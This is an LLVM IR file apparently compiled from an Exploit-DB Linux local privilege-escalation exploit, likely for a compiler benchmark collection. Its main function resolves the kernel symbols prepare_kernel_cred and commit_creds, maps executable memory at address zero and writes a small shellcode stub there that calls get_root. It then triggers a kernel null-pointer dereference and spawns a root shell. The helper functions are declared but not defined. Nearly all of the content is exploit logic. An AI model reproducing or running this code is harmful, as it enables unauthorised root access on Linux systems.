; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_44303.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_44303.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [20 x i8] c"prepare_kernel_cred\00", align 1
@prepare_kernel_cred = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [13 x i8] c"commit_creds\00", align 1
@commit_creds = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [43 x i8] c"Got commit_creds:%p,prepare_kernel_cred%p\0A\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"[+] Try to allocat 0x00000000...\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [34 x i8] c"[-] Failed to allocat 0x00000000\0A\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"[+] Allocation success !\0A\00", align 1
@__const.main.shellcode = private unnamed_addr constant [16 x i8] c"H\B8BBBBBBBB\FF\D0H1\C0\C3", align 16
@get_root = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [16 x i8], align 16
  %7 = alloca i8**, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0))
  store i64 %8, i64* @prepare_kernel_cred, align 8
  %9 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0))
  store i64 %9, i64* @commit_creds, align 8
  %10 = load i64, i64* @commit_creds, align 8
  %11 = load i64, i64* @prepare_kernel_cred, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0), i64 %10, i64 %11)
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0))
  %14 = load i32, i32* @PROT_READ, align 4
  %15 = load i32, i32* @PROT_WRITE, align 4
  %16 = or i32 %14, %15
  %17 = load i32, i32* @PROT_EXEC, align 4
  %18 = or i32 %16, %17
  %19 = load i32, i32* @MAP_ANON, align 4
  %20 = load i32, i32* @MAP_PRIVATE, align 4
  %21 = or i32 %19, %20
  %22 = load i32, i32* @MAP_FIXED, align 4
  %23 = or i32 %21, %22
  %24 = call i8* @mmap(i32 0, i32 4096, i32 %18, i32 %23, i32 -1, i32 0)
  %25 = icmp eq i8* %24, inttoptr (i64 -1 to i8*)
  br i1 %25, label %26, label %28

26:                                               ; preds = %2
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %39

28:                                               ; preds = %2
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0))
  %30 = bitcast [16 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %30, i8* align 16 getelementptr inbounds ([16 x i8], [16 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 16, i1 false)
  %31 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i64 0, i64 0
  %32 = call i8** @rawmemchr(i8* %31, i32 66)
  store i8** %32, i8*** %7, align 8
  %33 = load i8*, i8** @get_root, align 8
  %34 = load i8**, i8*** %7, align 8
  store i8* %33, i8** %34, align 8
  %35 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i64 0, i64 0
  %36 = call i32 @memcpy(i32 0, i8* %35, i32 16)
  %37 = call i32 (...) @touch_null_kp()
  %38 = call i32 (...) @get_shell()
  br label %39

39:                                               ; preds = %28, %26
  %40 = load i32, i32* %3, align 4
  ret i32 %40
}

declare dso_local i64 @get_kernel_sym(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @mmap(i32, i32, i32, i32, i32, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i8** @rawmemchr(i8*, i32) #1

declare dso_local i32 @memcpy(i32, i8*, i32) #1

declare dso_local i32 @touch_null_kp(...) #1

declare dso_local i32 @get_shell(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
